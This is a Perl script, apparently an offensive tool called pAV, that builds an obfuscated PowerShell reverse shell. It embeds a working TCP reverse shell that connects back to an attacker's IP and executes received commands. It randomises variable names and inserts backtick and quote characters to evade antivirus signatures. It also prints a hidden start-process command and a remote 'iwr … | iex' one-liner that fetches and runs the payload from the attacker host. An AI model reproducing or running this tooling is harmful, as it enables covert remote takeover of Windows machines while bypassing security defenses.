#!/usr/bin/perl
#spoNge369 2023

use warnings;
use strict;
use String::Random;
use Data::Dumper;
use Term::ANSIColor qw(:constants);
use List::Util qw(any);
use Getopt::Long qw(:config no_ignore_case);


my $ip_kali             = "";
my $port                = "6969";
my $raw_payload         = "";
my $likelihood          = 0.30;
my @keyword_random;
my @keyword_obf;
my $mode                = "";
my $help                = 0;

my @keyR;
my $keyMin              = 7;
my $keyMax              = 12;
my @obf;



GetOptions (
    'i|ip=s'             =>  \$ip_kali,
    'p|port=s'           =>  \$port,
    'l|like=f'           =>  \$likelihood,
    'raw|r=s'            =>  \$raw_payload,
    'm|mode=s'           =>  \$mode,
    'kr|keyRandom=s{3}'  =>  \@keyword_random,
    'ko|keyObf=s{2}'     =>  \@keyword_obf,
    'help|h'             =>  \$help

) or help();

my $payload =<<"PAYLOAD";
\$client = New-Object System.Net.Sockets.TCPClient('$ip_kali',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()
PAYLOAD

chomp($payload);

help() if($ip_kali eq '');
help() if($help);
help() if($raw_payload ne '' and
       (scalar(@keyword_random) ne 3 or
       scalar(@keyword_obf) ne 2));

if($raw_payload eq '') {
    print BOLD GREEN, "Using n`IsH`aNG default payload:\n\n", RESET;

} else {
    my @raw=fileToArray($raw_payload);
    $payload=join '', @raw;

    $payload=~s/\$ip/$ip_kali/g;
    $payload=~s/\$port/$port/g;
}

if(scalar(@keyword_random) eq 3) {

    @keyR=fileToArray($keyword_random[0]);
    #print Dumper @keyR and exit 1;
    $keyMin=$keyword_random[1];
    $keyMax=$keyword_random[2];

} else {#default
    @keyR=qw(\$client \$stream \$bytes \$i \$data \$sendback \$sendback2 
                \$sendbyte);
}

if(scalar(@keyword_obf) eq 2) {
    @obf=fileToArray($keyword_obf[0]);
    #print Dumper @obf and exit 1;
}


sub help {
    my $pav=<<'pav';
           ___ _    __
    ____  /   | |  / /
   / __ \/ /| | | / / 
  / /_/ / ___ | |/ /  
 / .___/_/  |_|___/ 
/_/            beta v1.0 
pav
    print BOLD GREEN, $pav, RESET.<<"HELP";
                    I don't anything E`vI`l, I just write ungly.
                    (github: \@spoNge369)

    Parameters               Description
    ==========               ===========

    -h|-help                  Help panel
    -i|-ip                    IP of the attacking machine(KALI)
    -p|-port                  Port (default: 6969, Optional)
    -r|-raw                   file. e.g. payload.ps1 (Optional)
    -ko|-keyObf               file word. e.g. obf.txt '`'. (Optional)
    -kr|-keyRandom            file min max, variables of powershell. (Optional)
    -l|-like                  probability of occurrence of ' or ` characters
                                    (default: 0.3). value 0-1. (Optional)

    Examples:

perl pAV.pl -i 10.0.1.232 -p 7878 -l 0.5
perl pAV.pl -i 10.0.1.232 -r nishangTcp.ps1 -ko obf.txt "'" -kr random.txt 3 10
HELP

    exit 1;
}


sub uppLower{
    my $command=shift;
    my $newC="";

    my $string=String::Random->new;

    my @arrayCommand=split("", $command);

    foreach my $ch (@arrayCommand) {

        if($ch eq '-') {
            $newC.="-";
            next;
        }
        $newC.="[$ch\U$ch]";

    }

    $newC=$string->randregex($newC);

    return $newC;

}

sub newReverse {
    my $command=shift;
    my $newC="";

    my $string = String::Random->new;

    my @arrayCommand=split("", $command);

    foreach my $ch (@arrayCommand) {

        if($ch eq '-') {
            $newC.="-";
            next;
        }
        $newC.="[$ch\U$ch]";

    }

    $newC=$string->randregex($newC);

    SPONGE:
    my @chars=split("", $newC);

    foreach(my $i=0; $i<scalar(@chars); $i++) {
        $chars[$i]='`'.$chars[$i] if(rand(1)<$likelihood);
    }

    goto SPONGE unless(any {/\`/} @chars);
    my $newFormat=join '', @chars;


    return $newFormat;

}

#print newReverse("whoami");

sub iexxd {
    my $string = String::Random->new;
    my $stringxd = $string->randregex("[iI][eE][xX]");
    #print "$iex\n";

    my @chars = split("", $stringxd);

    #print Dumper @chars;
    SPONGE: foreach(my $i=0; $i<scalar(@chars); $i++) {
        $chars[$i]='`'.$chars[$i] if(rand(1)<$likelihood);
    }

    goto SPONGE unless(any {/\`/} @chars);
    my $iex=join '', @chars;

    return $iex;
}

sub noSy {
    my $command=shift;
    my $newC="";

    my $string=String::Random->new;

    my @arrayCommand=split("", $command);

    foreach my $ch (@arrayCommand) {

        if($ch eq '-') {
            $newC.="-";
            next;
        }
        $newC.="[$ch\U$ch]";

    }

    $newC=$string->randregex($newC);
    
    SPONGE:
    my @chars=split("", $newC);

    foreach(my $i=0; $i<scalar(@chars); $i++) {
        $chars[$i]=$chars[$i].'\'' if(rand(1)<$likelihood);
    }

    my $count = scalar(grep(/\'/, @chars));
    #print "$count\n@chars\n";

    if(!($count % 2 eq 0)) {
        $count=0;
        goto SPONGE;
    }

    my $newFormat=join '', @chars;

    return $newFormat;


}

sub fileToArray {
    my $file=shift;

    open my $fh, '<:raw:encoding(utf-8)', $file
        or die "Failed to open file: $file";

    chomp(my @raw=<$fh>);
    @raw = grep {$_ ne ""} @raw;
    return @raw;
}


my $string = String::Random->new;
my @xd;

#my @keyR=qw(\$client \$stream \$bytes \$i \$data \$sendback \$sendback2 
#               \$sendbyte);
#print scalar(@keyword)."\n";
foreach(my $i=0; $i<scalar(@keyR); $i++) {
    my $len = $keyMin+int(rand($keyMax));
    XDD: my $ra = $string->randregex("[_a-z0-9A-Z_]{$len}");
    goto XDD if($ra=~m/^[0-9]/);
    push @xd, $ra;
}

foreach(my $i=0; $i<scalar(@keyR); $i++) {
    $payload=~s/$keyR[$i]/\$$xd[$i]/g;
}

#print $payload;
my $iex=newReverse("iex");
my $startProcess=noSy("start-process");
my $powershell=noSy("powershell");
my $WindowStyle=uppLower("-WindowStyle");
my $Hidden=noSy("Hidden");
my $Args=uppLower("-Args");
my $iwr=noSy("iwr");

#print $iex;
if(scalar(@keyword_obf) ne 2) {
    my $iex=newReverse("iex");
    $payload=~s/iex/$iex/g;

} else {
    foreach my $word (@obf) {
        last if(scalar(@obf) eq 0);
        my $commandObf="";
        if($keyword_obf[1] eq "'") {
            $commandObf=noSy($word);
            $payload=~s/$word/$commandObf/g;

        } elsif($keyword_obf[1] eq '`') {
            $commandObf=newReverse($word);
            $payload=~s/$word/$commandObf/g;
        } else {
            print BOLD RED, "Invalid character, only ' or ` is valid.",
                RESET and exit(1);
        }

    }

}

#print $payload."\n";
#
print "$startProcess $powershell $WindowStyle $Hidden $Args {$payload}";
print "\n\nRemote:\n$startProcess $powershell $WindowStyle $Hidden $Args".
        "{$iwr -useb IP_KALI:PORT/output_pav.ps1|$iex}\n";

open(BODY, '>', "./output_pav.ps1") or die $!;
print BODY $payload;
